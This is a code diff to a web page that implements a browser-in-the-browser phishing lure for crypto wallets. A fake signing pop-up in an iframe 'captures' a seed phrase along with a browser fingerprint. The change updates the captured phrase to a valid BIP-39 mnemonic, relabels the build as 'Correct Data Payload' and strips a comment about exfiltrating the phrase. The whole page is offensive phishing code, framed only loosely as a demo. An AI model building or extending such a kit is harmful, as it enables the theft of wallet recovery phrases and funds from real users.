@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v13.3: Vector Completion */
+        /* SYNTAX v13.4: Correct Data Payload */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         #bitb-container {
@@ -72,7 +72,8 @@
                 bitbContainer: document.getElementById('bitb-container'),
             };
 
-            const demoSeedPhrase = 'witch collapse practice feed shame open despair creator reel contain tell head';
+            // SYNTAX FIX: Using a cryptographically valid BIP-39 mnemonic phrase.
+            const demoSeedPhrase = 'legal winner thank year wave sausage worth useful legal winner thank yellow';
 
             ui.walletVerifyBtn.addEventListener('click', () => {
                 ui.initialState.style.display = 'none';
@@ -119,13 +120,12 @@
                 iframe.onload = () => {
                     const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                     
-                    // SYNTAX FIX: The "Sign" button now exfiltrates a demo seed phrase.
                     iframeDoc.getElementById('confirm-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
                         showFinalSuccess({ 
                             success: true, 
                             payload: 'BitB', 
-                            captured: demoSeedPhrase, // This is the critical change.
+                            captured: demoSeedPhrase, 
                             fingerprint 
                         });
                     };
